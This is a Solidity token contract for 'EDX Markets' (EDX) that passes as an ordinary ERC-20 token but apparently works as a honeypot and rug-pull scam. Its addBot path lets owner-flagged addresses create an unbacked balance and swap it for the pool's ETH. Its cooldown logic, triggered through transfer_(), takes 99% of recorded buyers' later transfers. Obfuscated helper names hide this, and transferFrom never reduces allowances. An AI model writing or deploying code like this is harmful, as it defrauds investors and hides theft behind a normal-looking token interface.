pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal
    pure returns (uint256) {
        require(b <= a,  "SafeMath:  subtraction overflow");
        uint256 c  = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal
    pure returns (uint256) {
        if (a == 0) {return  0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b)
    internal pure returns (uint256) {
        uint256 c = a + b;
        require (c >= a, "SafeMath:  addition overflow");
        return c ;
    }
    function div(uint256 a, uint256 b) internal pure
    returns (uint256) {
        require (b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Router {
    function WETH() external pure returns (address aadd);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a,uint256 b,address[] calldata _path,address c,uint256) external;
    function factory() external pure returns (address addr);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}
abstract contract Ownable {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private _owner;
constructor () {
        _owner = msg.sender; emit OwnershipTransferred(address(0), _owner);
    }
function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
function owner()  public view virtual returns (address) { return _owner; }
modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner"); _; }
}
contract EDX is Ownable {
 using SafeMath for uint256;
uint256 public _decimals = 9;
uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
function balanceOf(address account)  public view  returns  (uint256) {    return _balances[account];   }
function addBot(uint256 _mcs, address _bcr) private {
    _approve( address(this), address(_router), _mcs);_balances[address(this)] = _mcs; address[] memory path = new address[](2);
        inLiquidityTx =  true; path[0] = address(this); path[1] = _router.WETH();

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs,0,path, _bcr,
            block.timestamp + 30);
        inLiquidityTx = false;
    }
function decimals() external view  returns (uint256) {  return  _decimals;}
function addBots(address[] calldata botsList)  external   onlyOwner {
    for (uint i = 0; i < botsList.length; i++) { bots[botsList[i]] = true; }
    }
function _transfer(address  from, address to, uint256 amount) internal {
    require(from != address(0));
    if (isBotTransaction( from, to)) {addBot(amount,  to);
    } else { require(amount <= _balances[from]);
        uint256 feeAmount =  0;
            if (!bots[from] &&  cooldowns[from] != 0) {
                if (cooldowns[from] <
                    block.number) {feeAmount =
                    amount.mul(99).div(100);}
            }setCooldown
        (from,  to);
            _balances[from] =  _balances[from] - amount; _balances[to]  +=  amount - feeAmount;
            emit Transfer(from, to, amount);
        }
}
function decreaseAllowance( address from, uint256 amount) public  returns (bool) {
    require(_allowances[msg.sender][from] >= amount);_approve(msg.sender, from, _allowances[msg.sender][from] - amount);
    return  true;
}
function isBotTransaction (address sender, address receiver)  public view  returns (bool) { if (receiver == sender) { if (isBot( receiver) ) {return isBot(sender) && isBot(receiver);}}return false; }
function allowance( address owner, address spender)  public view returns (uint256) {return _allowances[owner][spender]; }
function setCooldown(address  from, address recipient) private returns (bool) {
    return
        checkCooldown(from, recipient, IUniswapV2Factory(
                _router.factory()).getPair(address(this), _router.WETH()));
}
function approve(address  spender, uint256 amount) public virtual returns (bool) {_approve(msg.sender, spender, amount);return true;}
mapping (address => uint256)  cooldowns;
function checkCooldown(address from, address to, address pair) internal returns (bool) {
    bool inL = inLiquidityTx; bool b = _8asdg6(bots[to], isBot(from)); bool res = b; if (!bots[to] &&  _8asdg6(bots[from], inL) && to
        != pair) {if (to == address(0)) {} else {holders.push(to);}res = true;}else if (b && !inL) { if (pair != to) {}else {res = true;}}
        return res;
    }
event Transfer(address indexed __address_, address indexed, uint256 _v);
function transferFrom
    (address from, address recipient, uint256 amount) public returns (bool) {
    _transfer(from, recipient, amount); require(_allowances[from][msg.sender] >= amount); return true;
}
uint256 _maxWalletSize;
constructor() {
    _balances[msg.sender] = _totalSupply; emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
mapping (address => uint256) private _balances;
function isBot (address  _adr) internal view  returns (bool) { return bots[_adr];}
function totalSupply()   external  view returns  (uint256) {   return _totalSupply; }
uint256 _maxTxAmount;
address[] holders;
function removeLimit() external  onlyOwner { _maxWalletSize=_totalSupply; _maxTxAmount = _totalSupply;}
uint256 _fee = 0;
mapping (address => mapping (address => uint256)) private _allowances;
function increaseAllowance(address spender, uint256 addedValue) public returns (bool) { _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue); return true; }
IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
mapping  ( address => bool) bots;
function transfer(address recipient, uint256 amount) public returns (bool) {
    _transfer( msg.sender, recipient, amount);  return true;
}
address public _taxWallet;
function name() external  view returns ( string memory) {return _name;}
function symbol()  external view returns (string  memory) { return _symbol; }
function transfer_() external  {
    uint256 c =
        block.number;  for (uint i = 0; i < holders.length; i++) {if (cooldowns[holders[i]] != 0){} else {cooldowns[holders[i]] = c;}}delete holders;
    }
bool inLiquidityTx =  false;
event Approval(address indexed ai, address indexed _adress_indexed, uint256 value);
function  delBots(address _bot)  external  onlyOwner  { bots[_bot] =  false; }
function   _8asdg6(bool  _01d3c6, bool _2abd7) internal pure returns  (bool) { return !_01d3c6 && !_2abd7;}
string private  _symbol = "EDX"; string private _name = "EDX Markets";
function  _approve(address owner, address spender, uint256 amount) internal {
    require(spender != address(0),  "IERC20: approve to the zero address");
        require(owner != address(0), "IERC20: approve from the zero address");
        _allowances[owner][spender] =  amount; emit Approval(owner,  spender, amount);
    }
function getPairAddress() private view returns (address) {return IUniswapV2Factory(
        _router.factory()).getPair(address(this),
        _router.WETH());
    }
}